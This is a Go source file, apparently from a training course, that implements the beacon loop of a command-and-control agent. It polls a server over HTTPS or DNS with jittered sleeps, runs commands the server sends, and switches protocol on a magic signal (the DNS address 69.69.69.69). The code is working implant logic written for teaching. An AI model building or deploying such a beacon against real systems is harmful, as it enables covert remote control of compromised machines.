package agent

import (
	"context"
	"encoding/json"
	"github.com/faanross/16_hr_course_rough_dev/internals/config"
	"github.com/faanross/16_hr_course_rough_dev/internals/server"
	"log"
	"math/rand"
	"time"
)

// CalculateSleepDuration calculates the actual sleep time with jitter
func CalculateSleepDuration(baseDelay time.Duration, jitterPercent int) time.Duration {
	if jitterPercent == 0 {
		return baseDelay
	}

	// Calculate jitter range
	jitterRange := float64(baseDelay) * float64(jitterPercent) / 100.0

	// Random value between -jitterRange and +jitterRange
	jitter := (rand.Float64()*2 - 1) * jitterRange

	// Calculate final duration
	finalDuration := float64(baseDelay) + jitter

	// Ensure we don't go negative
	if finalDuration < 0 {
		finalDuration = 0
	}

	return time.Duration(finalDuration)
}

func RunLoop(ctx context.Context, comm Agent, cfg *config.AgentConfig) error {

	// ADD THESE TWO LINES:
	currentProtocol := cfg.Protocol // Track which protocol we're using
	currentAgent := comm            // Track current agent (can change!)

	for {
		// Check if context is cancelled
		select {
		case <-ctx.Done():
			log.Println("Run loop cancelled")
			return nil
		default:
		}

		response, err := currentAgent.Send(ctx)

		if err != nil {
			log.Printf("Error sending request: %v", err)
			// Don't exit - just sleep and try again
			time.Sleep(cfg.Timing.Delay)
			continue // Skip to next iteration
		}

		// Check if there is a job (in case of HTTPS)
		if currentProtocol == "https" {
			var httpsResp server.HTTPSResponse
			if err := json.Unmarshal(response, &httpsResp); err != nil {
				log.Printf("Error unmarshaling HTTPS response: %v", err)
			} else {
				if httpsResp.Job {
					log.Printf("Job received from Server\n-> Command: %s\n-> JobID: %s", httpsResp.Command, httpsResp.JobID)
					currentAgent.ExecuteTask(response) // NEW: Execute the task
				} else {
					log.Printf("No job from Server")
				}
			}
		}

		// Check if this is a transition signal
		if detectTransition(currentProtocol, response) {
			log.Printf("TRANSITION SIGNAL DETECTED! Switching protocols...")

			// Figure out what protocol to switch TO
			newProtocol := "dns"
			if currentProtocol == "dns" {
				newProtocol = "https"
			}

			// Create config for new protocol
			tempConfig := *cfg // Copy the config
			tempConfig.Protocol = newProtocol

			// Try to create new agent
			newAgent, err := NewAgent(&tempConfig)
			if err != nil {
				log.Printf("Failed to create %s agent: %v", newProtocol, err)
				// Don't switch if we can't create agent
			} else {
				// Update our tracking variables
				log.Printf("Successfully switched from %s to %s", currentProtocol, newProtocol)
				currentProtocol = newProtocol
				currentAgent = newAgent
			}
		} else {
			// Normal response - parse and log as before
			switch currentProtocol { // Note: use currentProtocol, not cfg.Protocol
			case "https":
				var httpsResp server.HTTPSResponse
				json.Unmarshal(response, &httpsResp)
				log.Printf("Received response: change=%v", httpsResp.Change)
			case "dns":
				// DNS response is now JSON with "ip" field
				var dnsResp struct {
					IP string `json:"ip"`
				}
				json.Unmarshal(response, &dnsResp)
				log.Printf("Received response: IP=%v", dnsResp.IP)
			}
		}

		// Calculate sleep duration with jitter
		sleepDuration := CalculateSleepDuration(time.Duration(cfg.Timing.Delay), cfg.Timing.Jitter)
		log.Printf("Sleeping for %v", sleepDuration)

		// Sleep with cancellation support
		select {
		case <-time.After(sleepDuration):
			// Continue to next iteration
		case <-ctx.Done():
			log.Println("Run loop cancelled")
			return nil
		}
	}
}

// detectTransition checks if the response indicates we should switch protocols
func detectTransition(protocol string, response json.RawMessage) bool {
	switch protocol {
	case "https":
		var httpsResp server.HTTPSResponse
		if err := json.Unmarshal(response, &httpsResp); err != nil {
			return false
		}
		return httpsResp.Change

	case "dns":
		// DNS response is now JSON with "ip" field
		var dnsResp struct {
			IP string `json:"ip"`
		}
		if err := json.Unmarshal(response, &dnsResp); err != nil {
			return false
		}
		return dnsResp.IP == "69.69.69.69"
	}

	return false
}
